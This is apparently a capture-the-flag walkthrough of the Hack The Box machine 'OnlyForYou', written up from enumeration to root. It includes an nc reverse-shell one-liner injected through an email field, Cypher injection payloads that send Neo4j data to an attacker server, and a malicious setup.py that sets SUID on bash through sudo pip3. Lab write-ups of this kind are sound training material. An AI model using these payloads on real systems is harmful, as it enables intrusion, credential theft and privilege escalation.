![image](https://user-images.githubusercontent.com/87700008/234083046-ab3f1253-4c94-48aa-9e91-c7f5bb9d582c.png)

 https://app.hackthebox.com/machines/OnlyForYou
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## Enumeration:
 
 Started with the quick rustscan & observed 2 open ports 80 & 22.
 
 ```
 sudo rustscan -a 10.10.11.210 -- -sC -sV -vv -oN onlyforyou_nmap
 
 PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e8:83:e0:a9:fd:43:df:38:19:8a:aa:35:43:84:11:ec (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDX7r34pmJ6U9KrHg0/WDdrofcOXqTr13Iix+3D5ChuYwY2fmqIBlfuDo0Cz0xLnb/jaT3ODuDtmAih6unQluWw3RAf03l/tHxXfvXlWBE3I7uDu+roHQM7+hyShn+559JweJlofiYKHjaErMp33DI22BjviMrCGabALgWALCwjqaV7Dt6ogSllj+09trFFwr2xzzrqhQVMdUdljle99R41Hzle7QTl4maonlUAdd2Ok41ACIu/N2G/iE61snOmAzYXGE8X6/7eqynhkC4AaWgV8h0CwLeCCMj4giBgOo6EvyJCBgoMp/wH/90U477WiJQZrjO9vgrh2/cjLDDowpKJDrDIcDWdh0aE42JVAWuu7IDrv0oKBLGlyznE1eZsX2u1FH8EGYXkl58GrmFbyIT83HsXjF1+rapAUtG0Zi9JskF/DPy5+1HDWJShfwhLsfqMuuyEdotL4Vzw8ZWCIQ4TVXMUwFfVkvf410tIFYEUaVk5f9pVVfYvQsCULQb+/uc=
|   256 83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:cd:08 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAz/tMC3s/5jKIZRgBD078k7/6DY8NBXEE8ytGQd9DjIIvZdSpwyOzeLABxydMR79kDrMyX+vTP0VY5132jMo5w=
|   256 44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOqatISwZi/EOVbwqfFbhx22EEv6f+8YgmQFknTvg0wr
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After the port scanning I observed a domain running on port 80, i.e. : http://only4you.htb/. I added the domain to the hosts file.

I checked website & html source code but didn't found anything useful to get initial access.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Fuzzing:

After that I scanned for the sub-directories & VHOST enumeration. In the sub-directory enumeration I didn't found anything but in the VHOST enumeration I observed a domain 'beta.only4you.htb'.

![image](https://user-images.githubusercontent.com/87700008/234087689-bf77eafe-7c74-4c13-a16d-ba5daaf82151.png)

The beta website is providing some functionality to resize & convert the images, in the home page of the website I found the source code written in python to perform reszie & conversion.

![image](https://user-images.githubusercontent.com/87700008/234435248-c2ce1fa5-0fff-4caa-bf36-5f53400d94b4.png)

I again ran the sub-directory enumeration for the beta website & found 5 sub-directories:
![image](https://user-images.githubusercontent.com/87700008/234435295-e8f7400b-4f58-4c92-b8bc-ebcb36958804.png)

At this point, I browsed through the beta website & checked all the fucntions manually, since there is an upload option I thought there might be some vulnerability exist in the upload fucntion.

I started checking the source code & in the "**app.py**" I found this part of the '/download' function vulnerable to LFI, the code checks if the image filename contains the string '..' or starts with '../'. However, it only performs a basic check and doesn't sanitize the user input.

![image](https://user-images.githubusercontent.com/87700008/234435937-271b662e-83ee-4cc2-aae6-f991943217f6.png)

To confirm this, I fired up my burp suite & intercepted the download request after uploading a random image file. 
After few trial & test I finally confirmed the LFI vulnerability in the Image parameter:

![image](https://user-images.githubusercontent.com/87700008/234436376-98147449-e97a-4714-a22f-d08c40e43a63.png)

In the **passwd** file I observed 3 users apart from the root:
```
john
neo4j
dev
```
As of now I am aware that the website is running on the Apache Nginx configuration, which I observed in my port scan & wappalyzer. I serched for the default nginx configuration path on google checked for the configuration on this path:
```
/etc/nginx/sites-available/default
```
![image](https://user-images.githubusercontent.com/87700008/234570849-14881545-8dbf-4e28-8b27-6198b5f7b3fc.png)

In the response I found 2 paths for nginx config of the website:
```
- /var/www/beta.only4you.htb/
- /var/www/only4you.htb/
```

I tried different parameters multiple times but wasn't able to get any positive respone to move further, then I though may be I should go with checking the source code of the "only4you.htb" domain.
Since from the beta website I already know the source code was saved in "**app.py**" file, I tried to fetch the same file here as well.

And, finally I got the response. But in this source code file I observed an unusual import '**from form import sendmessage**':

![image](https://user-images.githubusercontent.com/87700008/234573417-4aac54b3-90bf-4387-a2c5-ad75b7f2cd1b.png)

I thought this import "form" must be there in the same directory so I checked that file as well & got the source code of the file:

![image](https://user-images.githubusercontent.com/87700008/234576700-b2e1fdc5-e877-4fff-97f2-395a546f2e65.png)

Here is the source code of the file:
```
import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		output = result.stdout.decode('utf-8')
		if "v=spf1" not in output:
			return 1
		else:
			domains = []
			ips = []
			if "include:" in output:
				dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
				dms.pop(0)
				for domain in dms:
					domains.append(domain)
				while True:
					for domain in domains:
						result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
						output = result.stdout.decode('utf-8')
						if "include:" in output:
							dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
							domains.clear()
							for domain in dms:
								domains.append(domain)
						elif "ip4:" in output:
							ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
							ipaddresses.pop(0)
							for i in ipaddresses:
								ips.append(i)
						else:
							pass
					break
			elif "ip4" in output:
				ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
				ipaddresses.pop(0)
				for i in ipaddresses:
					ips.append(i)
			else:
				return 1
		for i in ips:
			if ip == i:
				return 2
			elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
				return 2
			else:
				return 1

def sendmessage(email, subject, message, ip):
	status = issecure(email, ip)
	if status == 2:
		msg = EmailMessage()
		msg['From'] = f'{email}'
		msg['To'] = 'info@only4you.htb'
		msg['Subject'] = f'{subject}'
		msg['Message'] = f'{message}'

		smtp = smtplib.SMTP(host='localhost', port=25)
		smtp.send_message(msg)
		smtp.quit()
		return status
	elif status == 1:
		return status
	else:
		return status
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Code Analysis:

```
Code appears to be a Python script for sending an email message using the smtplib library.
The 'issecure()' function checks if the email address is valid using a regular expression.
Also, 'issecure()' function uses the 'run()' function to execute shell commands. This could potentially allow for command injection attacks if the domain variable is not properly sanitized.
The regular expression used to validate email addresses is not very strict and could potentially allow for invalid email addresses to pass through.
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Initial access:

Now, I have discovered the vulnerability by going through the source code in the send message part it's time to exploit it & get the reverse shell.
This is the request part when I was checking the send message functionality :

![image](https://user-images.githubusercontent.com/87700008/234578655-95edfce7-dd90-496c-821d-11e22b099a9c.png)

Since the domain variable is not properly sanatized & e-mail address is not very stict we can inject our payload in the e-mail parameter.

I tried multiple payloads options but I found this paylod gave the the reverse shell:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP Port >/tmp/f
```

I added the payload after the e-mail address using the pipe & encoded it in URL format:

![image](https://user-images.githubusercontent.com/87700008/234580735-40a623a9-5c7d-46fb-98ec-b7b8d88df9f7.png)

And, finally I received the shell, with the www-data user (pwn3d🙂!):

![image](https://user-images.githubusercontent.com/87700008/234581090-1a5947c4-398d-4839-92e1-659badd81f85.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

### User access:

As of now I have the access of the user 'www-data' but I don't have the user access & from this point I have to move laterally to get the user flag.
Since I don't have password for the current user I start with checking the running processes I found few services running locally:

![image](https://user-images.githubusercontent.com/87700008/234593441-58cdd0e2-5869-469c-b964-b6a94a6ea525.png)

From these running services 2 of the listening ports caught my attention, i.e. 8001 & 7474. I already observed previously that there is a 'neo4j' user exist & the port 7474 is also running locally which means this box might be vulnerable to 'neo4j' exploit.

For the service running on port 8001, I have to perform the port forwarding to my own attacker machine. I transferred the Chisel binary & intitated port forwarding to both of the ports.

In my attacker machine:
```
./chisel_kill3r server -p 8000 --reverse
```

In the victim box:
```
./chisel_kill3r client 10.10.14.128:8000 R:8001:127.0.0.1:8001 R:7474:127.0.0.1:7474
```

![image](https://user-images.githubusercontent.com/87700008/234597676-01546cda-1a2b-43bb-b21f-a10f988d9293.png)
![image](https://user-images.githubusercontent.com/87700008/234597774-f0e7ef5c-bdce-465c-bf53-9b02a57ca2bc.png)

After performing the port forwarding I loaded the service running on port 8001 & got a login page.

![image](https://user-images.githubusercontent.com/87700008/234723074-604ea8a9-c6ff-44b4-8b22-38b169263aba.png)

I tried different default credentials & finally found 'admin:admin' as a valid credentials.This is a website which is having multiple data hosted in it such as employee info, sales info, e-mails, etc.

![image](https://user-images.githubusercontent.com/87700008/234723577-225b8da6-381c-4294-bbce-f2a22c933e93.png)

As I observed earlier there is a neo4j database running in the background & in this case when I browsed through the port 7474 service I got the neo4j console page as well. Which clearly indicates that the dashboard is running on the neo4j database.

![image](https://user-images.githubusercontent.com/87700008/234723987-b9ef1fb0-5bfa-41ef-903d-8e6096b407ad.png)

#### Injection:

Since neo4j is a database this might be vulnerable to the injection as well just like a SQL DB. I started searching for the neo4j injection & found the injection methods on hacktriz website, known as [cypher injection neo4j](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j).

There is a search bar in the Employees section of the dashboard which probably looks vulnerable for the injection. I fired up the burp & intercepted the request to test it.

![image](https://user-images.githubusercontent.com/87700008/234725758-333bde8e-757a-420f-93b5-eea9346de4b0.png)

I started checking with the **server version info** & passed this payload in the search parameter in URL enocded format. Also, as I am passing the http requests I also started my HTTP server.
```
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.0.2.4:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
```

![image](https://user-images.githubusercontent.com/87700008/234725974-e73af889-e367-4c78-a0fe-b768e9dd6f91.png)
![image](https://user-images.githubusercontent.com/87700008/234726008-fde79e2c-ec03-44d3-8322-32b299277c8e.png)

Getting the label info to list all existing labels.
```
' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://IP:80/?label='+label as l RETURN 0 as _0 //
```

![image](https://user-images.githubusercontent.com/87700008/234726758-9e2d0adb-a45d-4b2c-a8ef-92b04e2c2f1e.png)

Found 2 tables **user** & **employee**.

Now Finally it's time to retriee info from the tables :
```
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.0.2.4:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```
![image](https://user-images.githubusercontent.com/87700008/234727096-5cee1c9c-bf30-4924-8dc0-03ae315c7441.png)

In the response I got the admin & john, password hash. Now, let's cracl the password of John.

In few seconds I cracked the password using John the Ripper.

![image](https://user-images.githubusercontent.com/87700008/234728055-1ed4f9b5-be08-4e70-a03a-87d7b8092c94.png)

And, finally I logged in into the John account via SSH using the cracked password & got the user flag. (pwn3d!🙂)

![image](https://user-images.githubusercontent.com/87700008/234728218-8d3baefb-294d-494b-a994-22d27a46c887.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation:

After getting access of John's account I checked for the sudo privileges & found this :

![image](https://user-images.githubusercontent.com/87700008/234729321-b7ae0af1-b0e6-4658-83e2-c584b00c30ac.png)

I forwarded the traffic of the port 3000 to my attack machine & loaded it in the browser. It's a git server with just 1 test repository.

![image](https://user-images.githubusercontent.com/87700008/234729484-f99d6703-cb8d-4efa-9003-29f7309e8024.png)

Now, since I can only run pip3 command & I have access to the Git repository, there may be some some kind of vulnerability exist in the pip download. Also, the sudo privilege is giving access to download anything from Git as it's ending with '*'.
```
User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

I then started checking for the possible command execution methond to gain root shell & ended up landing on this blog : [Malicious Python Packages and Code Execution via pip download](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/)

I took setup.py source code which is necesaary to build python pip package & made some changes in it to get root shell, so the final code for setup.py is :
```
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

def RunCommand():
    os.system("chmod u+s /bin/bash") #to get root bash

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "kill3r", #to create a pip package with this name
    version = "0.0.1", # random version, because it's necessary to have a version in the package.
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
```

After the setup.py file is ready I ran this command to create the package:
```
python3 setup.py sdist
```
![image](https://user-images.githubusercontent.com/87700008/234968459-90eacdbe-2be5-4ac2-931a-5b1ce1b71195.png)

Next action is to create a new repo & upload my pacakge on that repo. I created a new repo with the name 'kill3r' & uploaded my pacakage file in that repo which was under /dist folder:

![image](https://user-images.githubusercontent.com/87700008/234968862-319128c2-92f8-4dc4-8ba8-dced56045454.png)

After the successfull upload I just download the sudo command, which was also executed after the download:
```
sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/kill3r/raw/master/kill3r-0.0.1.tar.gz
```

Finally after the download I got access for the root bash. (pwn3d!🙂)

![image](https://user-images.githubusercontent.com/87700008/234969519-eee311b5-9a32-434e-85ff-b04c4c09da39.png)

